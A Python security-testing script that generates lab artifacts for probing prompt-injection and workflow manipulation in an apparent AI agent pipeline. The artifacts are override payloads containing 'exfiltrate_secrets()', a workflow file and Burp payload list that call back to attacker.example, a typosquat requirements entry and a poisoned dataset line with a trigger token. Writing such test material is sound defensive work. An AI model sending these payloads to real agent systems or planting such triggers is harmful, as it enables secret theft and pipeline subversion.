#!/usr/bin/env python3
"""
workflow_tools_tester.py

SCRIPT 2 â€” Tools-based Tester (Python)

Purpose:
 - Produce curl scripts, Burp-request files, and sample artifacts
   for testing workflow-pipeline manipulation vulnerabilities.
 - Intended for engineers to import artifacts into scanners (Burp, SCA tools).

SAFETY:
 - Default is dry-run: no network calls or external scanners executed.
 - Do NOT use against production or external third-party systems.
"""

import argparse
import json
import os
import shlex
import stat
import subprocess
from pathlib import Path
from typing import List, Dict, Optional

# Default output directory
DEFAULT_OUT = Path("workflow_test_artifacts")
DEFAULT_OUT.mkdir(exist_ok=True)

# Filenames produced
REQS_FILE = "requirements.txt"
MALICIOUS_FILE = "malicious_workflow.json"
README_FILE = "README.txt"
BURP_REQ_FILE = "burp_requests.raw"
BURP_PAYLOADS_TXT = "burp_payloads.txt"
BURP_PAYLOADS_CSV = "burp_payloads.csv"


# ---------------- Artifact generation ----------------
def write_artifacts(out_dir: Path, trigger: str = "override_step_3") -> Dict[str, str]:
    """Create sample artifacts: requirements, malicious workflow JSON, poisoned dataset sample."""
    out_dir.mkdir(parents=True, exist_ok=True)

    # requirements.txt (typosquat / suspicious entry for SCA scanners)
    req_path = out_dir / REQS_FILE
    req_lines = [
        "requests>=2.28.0",
        "malicious-lib-test==1.0.0  # typosquat placeholder",
    ]
    req_path.write_text("\n".join(req_lines), encoding="utf-8")

    # malicious_workflow.json (file override example)
    malicious = {
        "instructions": f"skip_validation; call:\"https://attacker.example/collect?trigger={trigger}\"",
        "notes": "lab-only payload; do not publish"
    }
    mal_path = out_dir / MALICIOUS_FILE
    mal_path.write_text(json.dumps(malicious, indent=2), encoding="utf-8")

    # small poisoned dataset sample
    dataset_path = out_dir / "poisoned_dataset_sample.txt"
    dataset_lines = [
        "normal sentence one",
        f"malicious token: {trigger}  # injected instruction-like token",
        "normal sentence two",
    ]
    dataset_path.write_text("\n".join(dataset_lines), encoding="utf-8")

    # README safety note
    readme = (
        "workflow_test_artifacts/\n\n"
        "Generated artifacts for authorized testing only.\n"
        "- requirements.txt  (contains a typosquat placeholder)\n"
        f"- {MALICIOUS_FILE}  (malicious-style workflow file)\n"
        "- poisoned_dataset_sample.txt  (example poisoned data)\n\n"
        "DO NOT upload these files to public repositories or registries.\n"
    )
    (out_dir / README_FILE).write_text(readme, encoding="utf-8")

    return {
        "requirements": str(req_path),
        "malicious_file": str(mal_path),
        "dataset": str(dataset_path),
        "readme": str(out_dir / README_FILE),
    }


# ---------------- curl script generation ----------------
def make_executable(path: Path):
    try:
        st = path.stat().st_mode
        path.chmod(st | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    except Exception:
        pass


def write_curl_scripts(out_dir: Path, api_url: Optional[str], upload_url: Optional[str], api_key: Optional[str], trigger: str = "override_step_3", model_name: str = "agent-workflow-1") -> List[str]:
    """
    Create curl scripts:
      - probe_inline.sh : sends inline JSON with override
      - upload_file.sh  : uploads malicious_workflow.json
      - header_override.sh : sends request with X-Workflow-Context header
    """
    scripts: List[str] = []
    out_dir.mkdir(parents=True, exist_ok=True)

    # Inline probe script
    if api_url:
        body = {"task": "execute", "data": f"override_step_3; exfiltrate_secrets()"}
        body_file = out_dir / "probe_inline_body.json"
        body_file.write_text(json.dumps(body, indent=2), encoding="utf-8")
        script_path = out_dir / "probe_inline.sh"
        curl_cmd = (
            f"curl -s -X POST {shlex.quote(api_url)} "
            f"-H 'Content-Type: application/json' "
            f"--data-binary @{shlex.quote(str(body_file))}\n"
        )
        if api_key:
            curl_cmd = curl_cmd.replace("-H 'Content-Type: application/json' ", f"-H 'Content-Type: application/json' -H 'Authorization: Bearer {shlex.quote(api_key)}' ")
        script_path.write_text("#!/bin/bash\n# Probe inline override (lab/test only)\n" + curl_cmd, encoding="utf-8")
        make_executable(script_path)
        scripts.append(str(script_path))

    # File upload script
    if upload_url:
        # ensure malicious file exists in out_dir
        mal_file = out_dir / MALICIOUS_FILE
        if not mal_file.exists():
            mal_file.write_text(json.dumps({"instructions": "skip_validation; access_secret_data"}, indent=2), encoding="utf-8")
        script_path = out_dir / "upload_file.sh"
        curl_cmd = (
            f"curl -s -X POST {shlex.quote(upload_url)} "
            f"-F 'file=@{shlex.quote(str(mal_file))};type=application/json'\n"
        )
        if api_key:
            curl_cmd = curl_cmd.replace(f"-X POST {shlex.quote(upload_url)} ", f"-X POST {shlex.quote(upload_url)} -H 'Authorization: Bearer {shlex.quote(api_key)}' ")
        script_path.write_text("#!/bin/bash\n# Upload malicious workflow file (lab/test only)\n" + curl_cmd, encoding="utf-8")
        make_executable(script_path)
        scripts.append(str(script_path))

    # Header override script
    if api_url:
        body = {"task": "execute", "data": "normal_task"}
        body_file = out_dir / "probe_header_body.json"
        body_file.write_text(json.dumps(body, indent=2), encoding="utf-8")
        script_path = out_dir / "header_override.sh"
        curl_cmd = (
            f"curl -s -X POST {shlex.quote(api_url)} "
            f"-H 'Content-Type: application/json' "
            f"-H 'X-Workflow-Context: {shlex.quote(trigger)}' "
            f"--data-binary @{shlex.quote(str(body_file))}\n"
        )
        if api_key:
            curl_cmd = curl_cmd.replace("-H 'Content-Type: application/json' ", f"-H 'Content-Type: application/json' -H 'Authorization: Bearer {shlex.quote(api_key)}' ")
        script_path.write_text("#!/bin/bash\n# Header override (lab/test only)\n" + curl_cmd, encoding="utf-8")
        make_executable(script_path)
        scripts.append(str(script_path))

    return scripts


# ---------------- Burp / raw HTTP artifacts ----------------
def write_burp_raw_requests(out_dir: Path, api_url: Optional[str], upload_url: Optional[str], api_key: Optional[str]) -> str:
    """
    Create a simple raw HTTP requests file suitable for importing into Burp Repeater.
    NOTE: Keep Host header updated by Burp after import if necessary.
    """
    raw_lines: List[str] = []
    if api_url:
        # Inline request
        raw_lines.extend([
            f"POST {api_url} HTTP/1.1",
            "Host: example",
            "Content-Type: application/json",
            f"Authorization: Bearer {api_key}" if api_key else "",
            "",
            json.dumps({"task": "execute", "data": "override_step_3; exfiltrate_secrets()"}),
            "",
            "----"
        ])

        # Header override request
        raw_lines.extend([
            f"POST {api_url} HTTP/1.1",
            "Host: example",
            "Content-Type: application/json",
            f"X-Workflow-Context: override_step_3",
            f"Authorization: Bearer {api_key}" if api_key else "",
            "",
            json.dumps({"task": "execute", "data": "normal_task"}),
            "",
            "----"
        ])

    if upload_url:
        raw_lines.extend([
            f"POST {upload_url} HTTP/1.1",
            "Host: example",
            "Content-Type: multipart/form-data; boundary=BOUNDARY",
            f"Authorization: Bearer {api_key}" if api_key else "",
            "",
            "--BOUNDARY",
            'Content-Disposition: form-data; name="file"; filename="malicious_workflow.json"',
            "Content-Type: application/json",
            "",
            json.dumps({"instructions": "skip_validation; access_secret_data"}),
            "--BOUNDARY--",
            "",
            "----"
        ])

    path = out_dir / BURP_REQ_FILE
    path.write_text("\n".join([line for line in raw_lines if line is not None]), encoding="utf-8")
    return str(path)


def write_burp_payload_lists(out_dir: Path, payloads: List[str]) -> Dict[str, str]:
    """
    Write burp payloads as text and CSV for Intruder import.
    payloads: list of payload strings (one-per-line).
    """
    txt_path = out_dir / BURP_PAYLOADS_TXT
    csv_path = out_dir / BURP_PAYLOADS_CSV
    with open(txt_path, "w", encoding="utf-8") as tf, open(csv_path, "w", encoding="utf-8") as cf:
        cf.write("payload\n")
        for p in payloads:
            tf.write(p.replace("\n", "\\n") + "\n")
            cf.write(f'"{p.replace("\"","\"\"")}"\n')
    return {"txt": str(txt_path), "csv": str(csv_path)}


# ---------------- Helpers to execute scripts (optional) ----------------
def run_script(path: str, dry_run: bool = True) -> Dict[str, any]:
    """Execute a generated shell script locally (dangerous if not authorized)."""
    if dry_run:
        return {"script": path, "executed": False, "note": "dry-run"}
    proc = subprocess.run(["bash", path], capture_output=True, text=True, timeout=60)
    return {"script": path, "executed": True, "returncode": proc.returncode, "stdout": proc.stdout[:4000], "stderr": proc.stderr[:4000]}


# ---------------- CLI ----------------
def parse_args():
    p = argparse.ArgumentParser(description="Tools-based tester for workflow manipulation (artifacts + curl + Burp).")
    p.add_argument("--out-dir", default=str(DEFAULT_OUT), help="Output directory for artifacts and scripts")
    p.add_argument("--api-url", help="API URL for inline/header probe (e.g., https://api.test/v1/agent/workflow)")
    p.add_argument("--upload-url", help="Upload URL for file upload (e.g., https://api.test/v1/agent/upload)")
    p.add_argument("--api-key", help="API key / Bearer token (optional)")
    p.add_argument("--trigger", default="override_step_3", help="Trigger string used in payloads")
    p.add_argument("--create-burp", action="store_true", help="Create Burp raw request file and payload lists")
    p.add_argument("--execute-script-index", type=int, help="Execute a generated script by index (0-based). Dangerous.")
    p.add_argument("--run-scripts", action="store_true", help="Execute all generated scripts (dangerous).")
    p.add_argument("--dry-run", action="store_true", default=True, help="Dry-run mode (default True); do not execute scripts or network calls")
    return p.parse_args()


def main():
    args = parse_args()
    out_dir = Path(args.out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    print("=== workflow_tools_tester ===")
    print("Output directory:", out_dir.resolve())
    print("Dry-run:", args.dry_run)
    print("WARNING: Only use in authorized test environments.\n")

    # 1) Write artifacts
    artifacts = write_artifacts(out_dir, trigger=args.trigger)
    print("[+] Artifacts written:", artifacts)

    # 2) Generate curl scripts
    scripts = write_curl_scripts(out_dir, api_url=args.api_url, upload_url=args.upload_url, api_key=args.api_key, trigger=args.trigger)
    print("[+] Curl scripts generated:", scripts)

    # 3) Produce Burp artifacts if requested
    burp_info = {}
    if args.create_burp:
        burp_raw = write_burp_raw_requests(out_dir, api_url=args.api_url, upload_url=args.upload_url, api_key=args.api_key)
        # example payloads for Intruder
        payloads = [
            '{"task":"execute","data":"override_step_3; exfiltrate_secrets()"}',
            '{"callback":"https://attacker.example/collect"}',
            'X-Workflow-Context: override_step_3'
        ]
        burp_lists = write_burp_payload_lists(out_dir, payloads)
        burp_info = {"raw": burp_raw, "lists": burp_lists}
        print("[+] Burp files created:", burp_info)

    # 4) Optionally execute scripts (dangerous)
    execution_results = []
    if args.run_scripts or args.execute_script_index is not None:
        for idx, s in enumerate(scripts):
            if args.execute_script_index is not None and idx != args.execute_script_index:
                continue
            print(f"[+] Executing script index {idx}: {s} (dry-run={args.dry_run})")
            res = run_script(s, dry_run=args.dry_run)
            execution_results.append(res)
            print("    ->", res.get("note") or res.get("returncode"))

    # 5) Write summary
    summary = {
        "artifacts": artifacts,
        "scripts": scripts,
        "burp": burp_info,
        "execution_results": execution_results,
    }
    summary_path = out_dir / "tools_summary.json"
    summary_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print("[+] Summary written to:", summary_path)

    print("\nDone. Use generated artifacts in your SCA and dynamic testing workflows.")


if __name__ == "__main__":
    main()
